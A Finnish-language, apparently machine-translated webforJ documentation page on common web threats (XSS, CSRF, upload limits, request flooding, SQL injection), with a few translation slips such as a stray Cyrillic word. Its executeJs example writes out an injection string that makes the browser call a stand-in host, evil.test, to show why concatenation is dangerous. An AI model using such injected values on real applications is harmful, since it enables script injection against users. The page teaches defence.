---
sidebar_position: 2
title: Common Threats
description: >-
  How common web threats such as cross-site scripting (XSS), cross-site request
  forgery (CSRF), and SQL injection apply to a webforJ app, what the framework
  handles, and where you stay responsible.
_i18n_hash: f19a2bbb311243417c723fe49ad7d72f
---
Koska webforJ-sovellus toimii Javalla palvelimella ja selain renderöi vain käyttöliittymän (katso artikkeli [Asiakas/Palvelin vuorovaikutus](/docs/architecture/client-server)), useat hyökkäysluokat on suunniteltu sisällyttämään. Muut riippuvat siitä, miten kirjoitat koodisi. Tällä sivulla käydään läpi tärkeimmät uhkat ja tehdään selkeä ero sen välillä, mitä webforJ hoitaa ja mikä on sinun hoidettavissasi.

## Cross-site scripting (XSS) {#cross-site-scripting-xss}

Cross-site scripting (XSS) -hyökkäys onnistuu, kun merkkijono, jonka on tarkoitus näkyä tekstinä, tulkitaan sen sijaan eläväksi merkinnäksi selaimessa. webforJ sulkee tämän oletuksena pois: kun asetat komponentin tekstin, arvo näytetään kirjaimellisesti, joten sen sisällä olevat тегit näkyvät merkkeinä eivätkä koskaan suoritu.

```java
// Näytetään kirjaimellisina merkkeinä "<b>hi</b>"
component.setText("<b>hi</b>");
```

Reaaliaikaisen merkinnän renderöinti on erillinen, tahallinen vaihe. webforJ käsittelee arvoa merkintänä vain silloin, kun se on kääritty `<html>...</html>`-elementin sisään, mikä on juuri se, mitä `HasHtml`-huolen `setHtml`-metodi tekee puolestasi taustalla. Muulla tavoin asetettu arvo yksinkertaistetaan aluksi tavalliseksi tekstiksi.

```java
// Renderöity merkintänä, tarkoituksella
component.setHtml("<b>hi</b>");
```

:::danger Merkinnät, joihin suostut, eivät puhdistu puolestasi
Kehys ei puhdista merkintöjä, jotka kääritään `<html>`:n sisään. Heti kun jokin osa siitä on peräisin henkilöltä, tallennetusta tiedosta, kyselymerkkijonosta tai muusta lähteestä, jota et täysin hallitse, puhdista se itse ennen kuin se saavuttaa komponentin. Käytä ylläpidettyä puhdistajaa, kuten [jsoup](https://jsoup.org/) tai [OWASP Java HTML Sanitizer](https://owasp.org/www-project-java-html-sanitizer/), ja syötä sille sallittujen tagien lista, joita todella aikot sallia.
:::

### JavaScriptin suorittaminen {#executing-javascript}

Sama sääntö koskee myös skriptejä, joita suoritat asiakkaalla `executeJs`- ja sen asynkronisilla versioilla ( <JavadocLink type="foundation" location="com/webforj/concern/HasJsExecution" code='true'>HasJsExecution</JavadocLink> -rajapinta). `executeJs` suorittaa stringin, jonka annat sille ohjelmana, joten kaikki, mitä tällä stringillä on, on se, mitä selain suorittaa, mukaan lukien kaikki, mitä lisäsit epäluotettavasta arvosta.

```java
// Vaarallinen: arvo on rakennettu ohjelmatekstiin
el.executeJs("greet('" + name + "')");
```

Jos `name` sisältää `'); fetch('https://evil.test'); ('`, selain suorittaa seuraavan ohjelman:

```js
greet(''); fetch('https://evil.test'); ('')
```

Hyökkääjän `fetch` on nyt lause ohjelmassasi, joten se suoritetaan. Yhdistely on se, mikä teki syötteen *osaksi koodia*.

Pidä epäluotettavat arvot kokonaan skriptin ulkopuolella. Lähetä arvo asiakkaalle datana, aseta se elementtiin ja suorita sitten kiinteä skripti, joka lukee sen takaisin `component`-avainsanan kautta:

```java
// Turvallinen: arvo on data, jonka skripti lukee, ei koskaan koodia
el.setProperty("greetName", name);
el.executeJs("greet(component.greetName)");
```

Tässä selain suorittaa aina vain `greet(component.greetName)`. Siinä ei ole epäluotettavaa syötettä, jota tulkita. Arvo sijaitsee ominaisuudessa, ja merkkijonon arvon lukeminen ei koskaan suorita sitä, joten sama `name` välitetään `greet`-metodille tekstinä eikä koodina.

## Cross-site request forgery (CSRF) {#cross-site-request-forgery-csrf}

Cross-site request forgery (CSRF) -hyökkäys huijaa sisäänkirjautuneen käyttäjän selainta lähettämään toiminnon, jota käyttäjä ei koskaan aikonut. webforJ estää tämän omalta liikenteeltään ilman mitään asetuksia: kehys luottaa vain pyyntöihin, jotka kuuluvat nykyisen käyttäjän istuntoon, joten toisen alkuperän sivu ei voi ohjata sovellusta käyttäjän puolesta.

Tämä tulee näkyviin täsmälleen yhdessä tilanteessa. [Spring Security](/docs/security/getting-started) aktivoituu omilla vale-pyynnön suojauksillaan jokaiselle pyynnölle, eikä sillä ole tietoa webforJ:n kanavasta, joten se hylkäisi kehyksen liikenteen ja sovellus ei latautuisi. webforJ:n Spring-integraatio ratkaisee tämän puolestasi: <JavadocLink type="spring-integration" location="com/webforj/spring/security/WebforjSecurityConfigurer" suffix="#webforj()" code='true'>WebforjSecurityConfigurer.webforj()</JavadocLink> käskee Springiä ohittamaan tarkistuksen webforJ:n kehyksen pyyntöjen osalta. Tämä on turvallista, koska kehys suojaa jo näitä pyyntöjä, joten mitään ei jää vartioimatta.

:::info Käsin kootut Spring-konfiguraatiot
Jos kokoat `SecurityFilterChain`-rakennetta ilman `webforj()`-apua, sulje kehyksen pyynnöt Springin tarkistuksesta itse ja jätä tuo tarkistus päälle kaikille lisäämilleesi päätepisteille.
:::

## Rajoittamattomat tiedostojen lataukset {#unbounded-file-uploads}

Kaikkien kokoisten tai määrien tiedostojen hyväksyminen kutsuu palvelunestohyökkäystä, joka johtuu loppuun käytetystä muistista, levytilasta tai kaistasta. Rajoita, mitä hyväksyt latauskomponenteissa: ne tarjoavat `setMaxFileSize()`-metodin rajatakseen jokaisen tiedoston ja `setMaxFiles()`-metodin rajoittaakseen kuinka monta saapuu kerralla.

Kohdista tämä ensimmäiseksi linjaksi, ei ainoaksi. Selaimen puolen rajoitus voidaan kiertää, joten varmista katto myös palvelimella: aseta `webforj.fileUpload.maxSize` [asetuksessasi](/docs/configuration/properties) hylätäksesi ylisuuret lataukset ennen kuin ne saavuttavat koodisi, ja rajoita maksimipyynnön kokoa servlet-konttorissasi tai käänteisessä proxyssäsi.

## Pyyntöruuhkat {#request-flooding}

Manipuloitu asiakas voi myös yrittää ylittää palvelimen suoraan: lähettää yhden hyvin suuren pyynnön tai aloittaa uusia sovellusistuntoja nopeasti peräkkäin, kunnes muisti tai muut resurssit loppuvat. Koska palvelin ohjaa jokaista sovellusta, mikä tahansa ruuhka jommasta kummasta lajista saavuttaa sen suoraan.

webforJ voi rajoittaa molempia. Aseta `webforj.security.maxContentLength` rajoittamaan, tavuina, pyynnön kokoa, jonka sovellus hyväksyy, ja `webforj.security.maxInitPerMinute` rajoittamaan kuinka monta uutta sovellusistuntua alkaa joka minuutti. Molemmat oletusasettavat `0`, joka jättää ne pois käytöstä, joten aseta ne kaikenlaista epäluotettavaa liikennettä varten. Katso [Asetus]( /docs/configuration/properties) tarkkoja tietoja varten.

Kuten latausten osalta, käsittele näitä myös sisäisenä kerroksena ja rajoita pyyntöjen kokoa servlet-konttorissasi tai käänteisessä proxyssäsi.

## SQL-injektio {#sql-injection}

webforJ ei sijaitse missään lähellä tietokerroksesi, joten vastustus SQL-injektioita vastaan riippuu täysin kyselykoodistasi. Käytä parametroituja kyselyitä tai valmisteltuja lausuntoja siten, että arvot sidotaan parametreihin sen sijaan, että ne liitettäisiin lausuntoon, ja älä koskaan rakenna kyselyä yhdistämällä merkkijonoja käyttäjän syötteen kanssa. Tämä on tavallista JDBC- ja pysyvyyspinnan käytäntöä, ja se soveltuu muuttumattomana webforJ-sovelluksessa.
